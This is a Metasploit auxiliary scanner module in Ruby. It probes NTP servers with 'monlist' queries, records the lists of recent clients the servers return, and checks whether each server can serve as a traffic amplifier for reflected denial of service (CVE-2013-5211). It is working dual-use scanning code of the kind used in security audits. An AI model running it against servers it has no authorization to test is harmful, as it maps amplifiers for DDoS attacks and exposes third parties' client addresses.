##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::UDPScanner
  include Msf::Auxiliary::NTP
  include Msf::Auxiliary::DRDoS

  def initialize
    super(
      'Name'        => 'NTP Monitor List Scanner',
      'Description' => %q{
        This module identifies NTP servers which permit "monlist" queries and
        obtains the recent clients list. The monlist feature allows remote
        attackers to cause a denial of service (traffic amplification)
        via spoofed requests. The more clients there are in the list, the
        greater the amplification.
      },
      'References'  =>
        [
          ['CVE', '2013-5211'],
          ['URL', 'https://www.us-cert.gov/ncas/alerts/TA14-013A'],
          ['URL', 'http://support.ntp.org/bin/view/Main/SecurityNotice'],
          ['URL', 'http://nmap.org/nsedoc/scripts/ntp-monlist.html'],
        ],
      'Author'      => 'hdm',
      'License'     => MSF_LICENSE
    )

    register_options(
    [
      OptInt.new('RETRY', [false, "Number of tries to query the NTP server", 3]),
      OptBool.new('SHOW_LIST', [false, 'Show the recent clients list', 'false'])
    ], self.class)

    register_advanced_options(
    [
      OptBool.new('StoreNTPClients', [true, 'Store NTP clients as host records in the database', 'false'])
    ], self.class)
  end

  # Called for each IP in the batch
  def scan_host(ip)
    scanner_send(@probe, ip, datastore['RPORT'])
  end

  # Called for each response packet
  def scanner_process(data, shost, sport)
    @results[shost] ||= { messages: [], peers: [] }
    @results[shost][:messages] << Rex::Proto::NTP::NTPPrivate.new(data)
    @results[shost][:peers] << extract_peer_tuples(data)
  end

  # Called before the scan block
  def scanner_prescan(batch)
    @results = {}
    @aliases = {}
    @probe = Rex::Proto::NTP.ntp_private(datastore['VERSION'], datastore['IMPLEMENTATION'], 42)
  end

  # Called after the scan block
  def scanner_postscan(batch)
    @results.keys.each do |k|
      response_map = { @probe => @results[k][:messages] }
      peer = "#{k}:#{rport}"

      # TODO: check to see if any of the responses are actually NTP before reporting
      report_service(
        :host  => k,
        :proto => 'udp',
        :port  => rport,
        :name  => 'ntp'
      )

      peers = @results[k][:peers].flatten(1)
      unless peers.empty?
        print_good("#{peer} NTP monlist request permitted (#{peers.length} entries)")
        # store the peers found from the monlist
        report_note(
          :host  => k,
          :proto => 'udp',
          :port  => rport,
          :type  => 'ntp.monlist',
          :data  => {:monlist => peers}
        )
        # print out peers if desired
        if datastore['SHOW_LIST']
          peers.each do |ntp_peer|
            print_status("#{peer} #{ntp_peer}")
          end
        end
        # store any aliases for our target
        report_note(
          :host  => k,
          :proto => 'udp',
          :port  => rport,
          :type  => 'ntp.addresses',
          :data  => {:addresses => peers.map { |p| p[1] }.sort.uniq }
        )

        if (datastore['StoreNTPClients'])
          print_status("#{peer} Storing #{peers.length} NTP client hosts in the database...")
          peers.each do |r|
            maddr,mserv,mport = r
            report_note(
              :host => maddr,
              :type => 'ntp.client.history',
              :data => {
                :address => maddr,
                :port    => mport,
                :server  => mserv
              }
            )
          end
        end
      end

      vulnerable, proof = prove_drdos(response_map)
      what = 'NTP Mode 7 monlist DRDoS (CVE-2013-5211)'
      if vulnerable
        print_good("#{peer} - Vulnerable to #{what}: #{proof}")
        report_vuln({
          :host  => k,
          :port  => rport,
          :proto => 'udp',
          :name  => what,
          :refs  => self.references
        })
      else
        vprint_status("#{peer} - Not vulnerable to #{what}: #{proof}")
      end
    end

  end

  def extract_peer_tuples(data)
    return [] if data.length < (72 + 16)

    # NTP headers 8 bytes
    ntp_flags, ntp_auth, ntp_vers, ntp_code = data.slice!(0,4).unpack('C*')
    pcnt, plen = data.slice!(0,4).unpack('nn')
    return [] if plen != 72

    idx = 0
    peer_tuples = []
    1.upto(pcnt) do
      #u_int32 firsttime; /* first time we received a packet */
      #u_int32 lasttime;  /* last packet from this host */
      #u_int32 restr;     /* restrict bits (was named lastdrop) */
      #u_int32 count;     /* count of packets received */
      #u_int32 addr;      /* host address V4 style */
      #u_int32 daddr;     /* destination host address */
      #u_int32 flags;     /* flags about destination */
      #u_short port;      /* port number of last reception */

      _,_,_,_,saddr,daddr,_,dport = data[idx, 30].unpack("NNNNNNNn")

      peer_tuples << [ Rex::Socket.addr_itoa(saddr), Rex::Socket.addr_itoa(daddr), dport ]
      idx += plen
    end
    peer_tuples
  end

  # Fingerprint a single host
  def parse_reply(pkt)

    # Ignore "empty" packets
    return if not pkt[1]

    if(pkt[1] =~ /^::ffff:/)
      pkt[1] = pkt[1].sub(/^::ffff:/, '')
    end

    data = pkt[0]
    host = pkt[1]
    port = pkt[2]

    return if pkt[0].length < (72 + 16)

    # NTP headers 8 bytes
    ntp_flags, ntp_auth, ntp_vers, ntp_code = data.slice!(0,4).unpack('C*')
    vprint_status("#{host}:#{port} - ntp_auth: #{ntp_auth}, ntp_vers: #{ntp_vers}")
    pcnt, plen = data.slice!(0,4).unpack('nn')
    return if plen != 72

    idx = 0
    1.upto(pcnt) do
      #u_int32 firsttime; /* first time we received a packet */
      #u_int32 lasttime;  /* last packet from this host */
      #u_int32 restr;     /* restrict bits (was named lastdrop) */
      #u_int32 count;     /* count of packets received */
      #u_int32 addr;      /* host address V4 style */
      #u_int32 daddr;     /* destination host address */
      #u_int32 flags;     /* flags about destination */
      #u_short port;      /* port number of last reception */

      firsttime,lasttime,restr,count,saddr,daddr,flags,dport = data[idx, 30].unpack("NNNNNNNn")

      @results[host] ||= []
      @aliases[host] ||= {}
      @results[host] << [ Rex::Socket.addr_itoa(daddr), dport, Rex::Socket.addr_itoa(saddr) ]
      @aliases[host][Rex::Socket.addr_itoa(saddr)] = true
      if datastore['SHOW_LIST']
        print_status("#{host}:#{port} #{Rex::Socket.addr_itoa(saddr)} (lst: #{lasttime}sec., cnt: #{count})")
      end
      idx += plen
    end
  end
end
